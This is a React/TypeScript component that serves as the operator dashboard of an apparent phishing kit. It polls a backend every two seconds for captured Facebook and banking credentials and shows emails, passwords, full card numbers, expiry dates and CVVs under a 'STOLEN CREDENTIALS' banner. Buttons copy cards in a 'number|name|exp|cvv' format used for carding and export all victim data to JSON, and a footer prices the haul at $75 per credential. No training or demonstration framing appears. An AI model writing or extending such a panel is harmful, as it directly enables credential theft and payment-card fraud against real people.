'use client'

import { useState, useEffect } from 'react'
import { Database, Eye, EyeOff, Copy, Download } from 'lucide-react'

interface CapturedCredential {
  id: string
  timestamp: string
  type: string
  sessionId?: string
  email?: string
  password?: string
  cardNumber?: string
  cardHolder?: string
  expiryDate?: string
  cvv?: string
}

export default function CapturedData() {
  const [credentials, setCredentials] = useState<CapturedCredential[]>([])
  const [showPasswords, setShowPasswords] = useState(true) // Show passwords by default
  const [selectedData, setSelectedData] = useState<string[]>([])
  const [mounted, setMounted] = useState(false)

  useEffect(() => {
    setMounted(true)
    // Poll for new data
    const interval = setInterval(fetchLatestData, 2000)
    fetchLatestData()
    
    return () => clearInterval(interval)
  }, [])

  const fetchLatestData = async () => {
    try {
      const response = await fetch('/api/captured-data')
      if (response.ok) {
        const data = await response.json()
        setCredentials(data)
      }
    } catch (error) {
      console.error('Failed to fetch captured data:', error)
    }
  }

  const maskPassword = (password: string) => {
    return showPasswords ? password : '•'.repeat(password.length)
  }

  const maskCard = (cardNumber: string) => {
    if (showPasswords) return cardNumber
    return cardNumber.replace(/\d(?=\d{4})/g, '•')
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  const exportData = () => {
    const dataStr = JSON.stringify(credentials, null, 2)
    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr)
    
    const exportFileDefaultName = `captured_data_${Date.now()}.json`
    
    const linkElement = document.createElement('a')
    linkElement.setAttribute('href', dataUri)
    linkElement.setAttribute('download', exportFileDefaultName)
    linkElement.click()
  }

  // Group credentials by session and type to build complete profiles
  const groupedCredentials = credentials.reduce((acc: any[], cred) => {
    // Find existing session group
    let sessionGroup = acc.find(item => 
      item.sessionId === cred.sessionId && item.type === cred.type
    )
    
    if (!sessionGroup) {
      sessionGroup = {
        id: cred.id,
        sessionId: cred.sessionId || 'unknown',
        timestamp: cred.timestamp,
        type: cred.type,
        email: '',
        password: '',
        cardNumber: '',
        cardHolder: '',
        expiryDate: '',
        cvv: '',
      }
      acc.push(sessionGroup)
    }
    
    // Update with latest data
    if (cred.email && cred.email.length > sessionGroup.email.length) {
      sessionGroup.email = cred.email
    }
    if (cred.password && cred.password.length > sessionGroup.password.length) {
      sessionGroup.password = cred.password
    }
    if (cred.cardNumber) sessionGroup.cardNumber = cred.cardNumber
    if (cred.cardHolder) sessionGroup.cardHolder = cred.cardHolder  
    if (cred.expiryDate) sessionGroup.expiryDate = cred.expiryDate
    if (cred.cvv) sessionGroup.cvv = cred.cvv
    
    // Update timestamp to latest
    sessionGroup.timestamp = cred.timestamp
    
    return acc
  }, [])

  // Filter to show sessions with either complete login OR complete banking data
  const completeCredentials = groupedCredentials.filter(cred => 
    (cred.email && cred.password && cred.email.length > 0 && cred.password.length > 0) ||
    (cred.cardNumber && cred.cardNumber.length > 10)
  )

  if (!mounted) {
    return (
      <div className="bg-black border border-gray-600 rounded-b-lg">
        <div className="bg-gray-800 px-4 py-2 text-sm font-mono text-center">
          Loading...
        </div>
      </div>
    )
  }

  return (
    <div className="bg-black border border-gray-600 rounded-b-lg">
      <div className="bg-gray-800 px-4 py-2 text-sm font-mono flex justify-between items-center border-b border-gray-600">
        <span className="text-white">═══════ STOLEN CREDENTIALS ═══════</span>
        <div className="flex gap-4 items-center">
          <span className="text-yellow-400">Total: {completeCredentials.length}</span>
          <button
            onClick={() => setShowPasswords(!showPasswords)}
            className="text-blue-400 hover:text-blue-300"
          >
            {showPasswords ? 'HIDE' : 'SHOW'}
          </button>
          <button
            onClick={exportData}
            className="text-red-400 hover:text-red-300"
          >
            EXPORT
          </button>
        </div>
      </div>
      
      <div className="p-4 font-mono">
        {completeCredentials.length === 0 ? (
          <div className="text-center text-gray-400 py-8">
            [WAITING] No complete credentials captured yet...
          </div>
        ) : (
          <div className="space-y-4">
            {completeCredentials.map((cred) => (
              <div key={cred.id} className="border border-gray-700 bg-gray-900 p-4 rounded">
                <div className="flex justify-between items-center mb-3">
                  <span className="text-gray-400">[{cred.timestamp}]</span>
                  <span className={`px-3 py-1 rounded text-sm font-bold ${
                    cred.type === 'facebook' ? 'bg-blue-600 text-white' :
                    cred.type === 'banking' ? 'bg-red-600 text-white' :
                    'bg-orange-600 text-white'
                  }`}>
                    {cred.type.toUpperCase()}
                  </span>
                </div>
                
                <div className="space-y-1 text-white">
                  {cred.email && (
                    <div className="flex items-start">
                      <span className="text-yellow-400 w-12 flex-shrink-0">EMAIL:</span>
                      <span className="text-red-300 font-bold break-all">{cred.email}</span>
                    </div>
                  )}
                  {cred.password && (
                    <div className="flex items-start">
                      <span className="text-yellow-400 w-12 flex-shrink-0">PASS:</span>
                      <span className="text-red-300 font-bold break-all">
                        {showPasswords ? cred.password : '•'.repeat(cred.password?.length || 0)}
                      </span>
                    </div>
                  )}
                  
                  {cred.cardNumber && (
                    <div className="flex items-start">
                      <span className="text-yellow-400 w-12 flex-shrink-0">CARD:</span>
                      <span className="text-red-300 font-bold break-all">
                        {showPasswords ? cred.cardNumber : cred.cardNumber.replace(/\d(?=\d{4})/g, '•')}
                      </span>
                    </div>
                  )}
                  
                  {cred.cardHolder && (
                    <div className="flex items-start">
                      <span className="text-yellow-400 w-12 flex-shrink-0">NAME:</span>
                      <span className="text-red-300 font-bold break-all">{cred.cardHolder}</span>
                    </div>
                  )}
                  
                  {cred.expiryDate && (
                    <div className="flex items-start">
                      <span className="text-yellow-400 w-12 flex-shrink-0">EXP:</span>
                      <span className="text-red-300 font-bold">{cred.expiryDate}</span>
                    </div>
                  )}
                  
                  {cred.cvv && (
                    <div className="flex items-start">
                      <span className="text-yellow-400 w-12 flex-shrink-0">CVV:</span>
                      <span className="text-red-300 font-bold">
                        {showPasswords ? cred.cvv : '•••'}
                      </span>
                    </div>
                  )}
                </div>
                
                <div className="mt-3 flex gap-2">
                  <button
                    onClick={() => {
                      const data = `${cred.email}:${cred.password}`
                      copyToClipboard(data)
                    }}
                    className="bg-green-700 hover:bg-green-600 px-3 py-1 rounded text-sm text-white"
                  >
                    COPY LOGIN
                  </button>
                  {cred.cardNumber && (
                    <button
                      onClick={() => {
                        const data = `${cred.cardNumber}|${cred.cardHolder || ''}|${cred.expiryDate || ''}|${cred.cvv || ''}`
                        copyToClipboard(data)
                      }}
                      className="bg-red-700 hover:bg-red-600 px-3 py-1 rounded text-sm text-white"
                    >
                      COPY CARD
                    </button>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
        
        <div className="mt-6 text-center border-t border-gray-700 pt-4">
          <div className="text-green-400">
            [SUCCESS] {completeCredentials.length} complete credentials obtained
          </div>
          <div className="text-gray-400 text-sm mt-1">
            Estimated value: ${completeCredentials.length * 75} USD
          </div>
        </div>
      </div>
    </div>
  )
}